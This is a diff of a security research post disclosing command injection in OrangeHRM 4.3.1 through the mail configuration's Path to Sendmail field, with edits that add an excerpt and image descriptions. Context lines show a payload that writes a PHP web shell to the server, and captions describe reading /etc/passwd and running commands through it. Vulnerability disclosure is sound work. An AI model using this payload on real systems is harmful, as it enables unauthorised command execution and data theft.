@@ -3,6 +3,7 @@ title: "Arbitrary Command Execution in latest OrangeHRM platform"
 date: "2019-06-12"
 categories: 
   - "Research"
+excerpt: "Arbitrary command execution in OrangeHRM 4.3.1 and earlier through its Swift Mailer integration."
 ---
 
 ## Overview
@@ -27,7 +28,7 @@ An input validation error on `Path to Sendmail`  field via `listMailConfiguratio
 **Cause:** When processing requests to `/listMailConfiguration`, the form does not properly sanitize the certain POST parameter `($form['txtSendmailPath'])`
 **Code audit**:
 
-![](/images/HRM.png)
+![Source rendering the Path to Sendmail form field with only a maxlength of 100 and no sanitization](/images/HRM.png)
 
 As we can see above, after being supplied by an authenticated user, `$form['txtSendmailPath']` will then be sent directly to be processed.
 
@@ -75,7 +76,7 @@ emailConfigurationForm%5B\_csrf\_token%5D=426bbe900f93c903be83b3c6d4d1bcd0&email
 
 1 - Navigate to [http://localhost/symfony/web/index.php/admin/listMailConfiguration](http://localhost/symfony/web/index.php/admin/listMailConfiguration)
 
-![](/images/LIST.png)
+![OrangeHRM Mail Configuration page with the sendmail command injection payload in the Path to Sendmail field](/images/LIST.png)
 
 2 - Edit `Path to Sendmail` to have the following payload (limit 100 chars)
 ```
@@ -84,9 +85,9 @@ emailConfigurationForm%5B\_csrf\_token%5D=426bbe900f93c903be83b3c6d4d1bcd0&email
 
 3 - Update `Test Email Address` to send a test mail
 
-![](/images/SENT.png)
+![OrangeHRM Mail Configuration showing a Successfully Saved banner after sending the test email](/images/SENT.png)
 
-![](/images/exposed.png)
+![Browser at /exposure showing the /etc/passwd contents written out by the injected command](/images/exposed.png)
 
 
 ## Impact
@@ -101,9 +102,9 @@ Command injection is an attack in which the goal is execution of arbitrary comma
 /usr/sbin/sendmail -bs;echo "<?php if(\\$\_GET\['c'\]){system(\\$\_GET\['c'\]);}?>" >> /var/www/html/c.php
 ```
 
-![](/images/HRMShell.png)
+![Browser hitting c.php?c=id and returning uid=33(www-data), confirming the web shell](/images/HRMShell.png)
 
-![](/images/installHRM.png)
+![Browser running c.php?c=cat install.php, dumping the OrangeHRM installer source](/images/installHRM.png)
 
 
 ## Remediation
